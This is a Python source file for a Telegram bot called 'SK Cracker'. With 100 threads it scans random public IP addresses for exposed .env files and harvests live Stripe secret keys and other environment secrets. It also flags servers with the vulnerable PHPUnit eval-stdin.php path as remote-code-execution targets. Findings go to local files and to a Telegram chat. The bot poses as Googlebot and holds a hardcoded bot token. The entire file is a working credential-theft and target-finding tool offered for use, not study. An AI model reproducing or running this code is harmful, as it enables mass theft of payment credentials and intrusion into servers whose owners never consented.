import asyncio
import re
import random
import socket
import time
import queue
import threading
import requests

from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message

BOT_TOKEN = "8245356561:AAEpylYTe7jdZdwlZ1dzcRaRBs1AUXWot4I"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

STATS = {'checked': 0, 'live': 0, 'env_found': 0, 'sk_found': 0}
STATS_LOCK = threading.Lock()
RUNNING = False
NOTIFY_QUEUE = queue.Queue()

PRIVATE_RANGES = [
    (167772160,  184549375),
    (2886729728, 2887778303),
    (3232235520, 3232301055),
    (2130706432, 2130706687),
    (2851995648, 2852061183),
    (0,          16777215),
    (4026531840, 4294967295),
]

QUICK_ENV_PATHS = [
    '/.env', '/public/.env', '/api/.env', '/laravel/.env',
    '/backend/.env', '/server/.env', '/app/.env', '/src/.env',
    '/config/.env', '/.env.backup', '/.env.local', '/web/.env',
    '/admin/.env', '/frontend/.env', '/core/.env', '/v1/.env',
    '/prod/.env', '/production/.env', '/staging/.env', '/dev/.env',
]

PHPUNIT_PATHS = [
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
]

SK_PATTERNS = re.compile(
    r'sk_live_[A-Za-z0-9]{20,}|'
    r'STRIPE[_\-]SECRET[_\-]KEY\s*=\s*[\'"]?(sk_[A-Za-z0-9]+)|'
    r'STRIPE_KEY\s*=\s*[\'"]?(sk_[A-Za-z0-9]+)',
    re.IGNORECASE
)


def is_private_ip(ip):
    try:
        n = int.from_bytes(socket.inet_aton(ip), 'big')
        return any(lo <= n <= hi for lo, hi in PRIVATE_RANGES)
    except:
        return True


def rand_public_ip():
    while True:
        ip = (
            f"{random.randint(1,254)}."
            f"{random.randint(0,255)}."
            f"{random.randint(0,255)}."
            f"{random.randint(1,254)}"
        )
        if not is_private_ip(ip):
            return ip


def ac_fetch(session, url, timeout=4):
    try:
        r = session.get(url, timeout=timeout)
        return r.status_code, r.text
    except:
        return None, ''


def ac_worker(ip_queue, results_lock):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)'})
    while RUNNING:
        try:
            ip = ip_queue.get(timeout=2)
        except queue.Empty:
            continue

        base = f'http://{ip}'
        with STATS_LOCK:
            STATS['checked'] += 1

        code, _ = ac_fetch(s, base, timeout=3)
        if code is None:
            ip_queue.task_done()
            continue

        with STATS_LOCK:
            STATS['live'] += 1

        found_env_url = None
        env_text = ''

        for path in QUICK_ENV_PATHS:
            c, t = ac_fetch(s, base + path)
            if c == 200 and (
                'APP_NAME' in t or 'APP_KEY' in t
                or 'STRIPE' in t or 'sk_live' in t
            ):
                found_env_url = base + path
                env_text = t
                break

        for pp in PHPUNIT_PATHS:
            c, _ = ac_fetch(s, base + pp)
            if c == 200:
                NOTIFY_QUEUE.put(('phpunit', base + pp, ''))
                open('phpunit_rce.txt', 'a').write(base + pp + '\n')
                break

        if found_env_url is None:
            ip_queue.task_done()
            continue

        with STATS_LOCK:
            STATS['env_found'] += 1

        matches = SK_PATTERNS.findall(env_text)
        direct = re.findall(r'sk_live_[A-Za-z0-9]{20,}', env_text)
        all_keys = list(set([k for k in matches if k and 'sk_live' in k] + direct))

        with results_lock:
            if all_keys:
                with STATS_LOCK:
                    STATS['sk_found'] += len(all_keys)
                for k in all_keys:
                    NOTIFY_QUEUE.put(('sk', found_env_url, k))
                    open('SK_LIVE_FOUND.txt', 'a').write(f'{found_env_url} | {k}\n')
            else:
                NOTIFY_QUEUE.put(('env', found_env_url, env_text[:3500]))
                open('envs_nosk.txt', 'a').write(found_env_url + '\n')

        ip_queue.task_done()


def _stats_block():
    with STATS_LOCK:
        c = STATS['checked']
        l = STATS['live']
        e = STATS['env_found']
        s = STATS['sk_found']
    return (
        "<pre>"
        "╔══❮ SK CRACKER ❯══╗\n"
        f"║  status   ▸  {'RUNNING' if RUNNING else 'STOPPED'}\n"
        f"║  checked  ▸  {c}\n"
        f"║  live     ▸  {l}\n"
        f"║  env      ▸  {e}\n"
        f"║  sk keys  ▸  {s}\n"
        "╚═══════════════════╝"
        "</pre>"
    )


async def stats_updater(chat_id, msg_id):
    while RUNNING:
        await asyncio.sleep(5)
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=_stats_block(),
                parse_mode='HTML'
            )
        except Exception:
            pass

        while not NOTIFY_QUEUE.empty():
            try:
                kind, url, data = NOTIFY_QUEUE.get_nowait()
                if kind == 'sk':
                    text = (
                        "🟢 <b>SK KEY FOUND</b>\n"
                        f"<code>{url}</code>\n\n"
                        f"<code>{data}</code>"
                    )
                elif kind == 'env':
                    snippet = (data[:3500] if data else '').strip()
                    text = (
                        "🟡 <b>ENV FOUND — no SK key</b>\n"
                        f"<code>{url}</code>\n\n"
                        f"<pre>{snippet}</pre>"
                    )
                elif kind == 'phpunit':
                    text = f"🔴 <b>PHPUNIT RCE</b>\n<code>{url}</code>"
                else:
                    continue
                await bot.send_message(chat_id=chat_id, text=text, parse_mode='HTML')
            except Exception:
                pass

    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=_stats_block(),
            parse_mode='HTML'
        )
    except Exception:
        pass


@dp.message(Command('start'))
async def cmd_start(message: Message):
    global RUNNING
    if RUNNING:
        await message.answer("Already running. Send /stop to stop.")
        return

    RUNNING = True
    with STATS_LOCK:
        STATS['checked'] = STATS['live'] = STATS['env_found'] = STATS['sk_found'] = 0

    while not NOTIFY_QUEUE.empty():
        try:
            NOTIFY_QUEUE.get_nowait()
        except Exception:
            break

    stats_msg = await message.answer(_stats_block(), parse_mode='HTML')

    THREADS = 100
    ip_queue = queue.Queue(maxsize=20000)
    results_lock = threading.Lock()

    def ip_producer():
        while RUNNING:
            if ip_queue.qsize() < 10000:
                for _ in range(500):
                    if not RUNNING:
                        break
                    ip_queue.put(rand_public_ip())
            else:
                time.sleep(0.1)

    threading.Thread(target=ip_producer, daemon=True).start()

    for _ in range(THREADS):
        threading.Thread(
            target=ac_worker,
            args=(ip_queue, results_lock),
            daemon=True
        ).start()

    asyncio.create_task(stats_updater(message.chat.id, stats_msg.message_id))
    await message.answer(
        "✅ Auto crack started — <b>100 threads</b>\n"
        "Stats update every 5s. Findings are sent here instantly.\n"
        "Send /stop to stop.",
        parse_mode='HTML'
    )


@dp.message(Command('stop'))
async def cmd_stop(message: Message):
    global RUNNING
    if not RUNNING:
        await message.answer("Not currently running.")
        return
    RUNNING = False
    await message.answer("⛔ Stopped.\n" + _stats_block(), parse_mode='HTML')


@dp.message(Command('stats'))
async def cmd_stats(message: Message):
    await message.answer(_stats_block(), parse_mode='HTML')


async def main():
    print("SK Cracker Bot starting...")
    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())
